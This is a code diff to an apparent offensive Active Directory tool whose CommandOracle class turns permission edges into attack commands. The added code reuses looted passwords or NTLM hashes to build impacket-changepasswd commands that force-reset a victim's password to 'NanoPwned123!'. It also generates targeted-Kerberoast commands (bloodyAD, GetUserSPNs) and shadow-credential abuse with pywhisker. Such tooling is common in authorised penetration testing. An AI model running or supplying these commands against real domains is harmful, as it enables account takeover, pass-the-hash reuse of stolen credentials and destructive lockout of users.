@@ -12,6 +12,8 @@ EDGE_TOOL_MAP: dict[str, str] = {
     "GenericAll": "impacket-getST",
     "WriteDacl": "impacket-dacledit",
     "WriteOwner": "impacket-owneredit",
+    "ForceChangePassword": "impacket-changepasswd",
+    "CanForceChangePassword": "impacket-changepasswd",
     "MemberOf": "powerview",
 }
 
@@ -211,20 +213,33 @@ class CommandOracle:
                 f"powershell -c \"Get-DomainGroupMember -Identity '{target_group}'\""
             )
 
-        # ForcePasswordChange / CanForceChangePassword
-        if normalized_edge in ("ForcePasswordChange", "CanForceChangePassword"):
+        # ForceChangePassword / CanForceChangePassword
+        if normalized_edge in ("ForceChangePassword", "CanForceChangePassword"):
             target_user = target.name or "<TARGET_USER>"
-            # Extract username if it contains domain prefix
             if "\\" in target_user:
                 target_user = target_user.split("\\", maxsplit=1)[1]
             elif "@" in target_user:
                 target_user = target_user.split("@", maxsplit=1)[0]
             
-            new_password = "<NEW_PASSWORD>"
-            target_host = "<TARGET_HOST>"
+            source_cred = self.loot_manager.get_credential(source.id) or self.loot_manager.get_credential(source.name)
+            alt_auth_flag = ""
+            if source_cred:
+                if source_cred.ntlm_hash:
+                    alt_auth_flag = f"-althash :{source_cred.ntlm_hash}"
+                elif source_cred.password:
+                    alt_auth_flag = f"-altpass \"{source_cred.password}\""
+            
+            target_host = "<DC_IP_OR_HOSTNAME>"
+            alt_user = source.name or f"{domain}\\{username}"
+            alt_user_part = f"-altuser {alt_user}"
+            
+            cmd_args = f"{alt_user_part} {alt_auth_flag}".strip() if alt_auth_flag else f"{alt_user_part} -altpass \"<PASSWORD>\""
+            
             return (
-                f"impacket-psexec{auth_part} {domain}/{username}@{target_host} "
-                f"'net user {target_user} {new_password}'"
+                "# WARNING: This will change the target user's password. This is a destructive action.\n"
+                "# ForceChangePassword: reset target user password using impacket-changepasswd\n"
+                f"impacket-changepasswd {cmd_args} -newpass \"NanoPwned123!\" "
+                f"-reset {domain}/{target_user}@{target_host}"
             )
 
         # CanAddMember / AddMember
@@ -443,13 +458,34 @@ class CommandOracle:
             target_name_l = target_object.casefold()
 
             if target.node_type == "user":
+                target_user = target_object
+                if "\\" in target_user:
+                    target_user = target_user.split("\\", maxsplit=1)[1]
+                elif "@" in target_user:
+                    target_user = target_user.split("@", maxsplit=1)[0]
+                
+                source_cred = self.loot_manager.get_credential(source.id) or self.loot_manager.get_credential(source.name)
+                alt_auth_flag = ""
+                if source_cred:
+                    if source_cred.ntlm_hash:
+                        alt_auth_flag = f"-althash :{source_cred.ntlm_hash}"
+                    elif source_cred.password:
+                        alt_auth_flag = f"-altpass \"{source_cred.password}\""
+                
+                alt_user = source.name or f"{domain}\\{username}"
+                cmd_args = f"-altuser {alt_user} {alt_auth_flag}".strip() if alt_auth_flag else f"-altuser {alt_user} -altpass \"<PASSWORD>\""
+                
                 return (
-                    f"# GenericWrite on USER: common abuses\n"
-                    f"# 1) Targeted Kerberoast by writing SPN\n"
+                    f"# GenericWrite on USER: multiple abuse paths\n"
+                    f"# 1) Reset password via LDAP (impacket-changepasswd)\n"
+                    f"# WARNING: This will change the target user's password. This is a destructive action.\n"
+                    f"impacket-changepasswd {cmd_args} -protocol ldap -newpass \"NanoPwned123!\" "
+                    f"-reset {domain}/{target_user}@<DC_IP>\n"
+                    f"# 2) Targeted Kerberoast by writing SPN\n"
                     f"bloodyAD --host <DC_IP> -d {domain} -u {username}{auth_part} "
                     f"set object '{target_object}' servicePrincipalName -v 'HTTP/{target_object}'\n"
                     f"impacket-GetUserSPNs -dc-ip <DC_IP> -request {domain}/{username}{auth_part}\n"
-                    f"# 2) Shadow Credentials (msDS-KeyCredentialLink)\n"
+                    f"# 3) Shadow Credentials (msDS-KeyCredentialLink)\n"
                     f"pywhisker -d {domain} -u {username}{auth_part} "
                     f"--target '{target_object}' --action add"
                 )
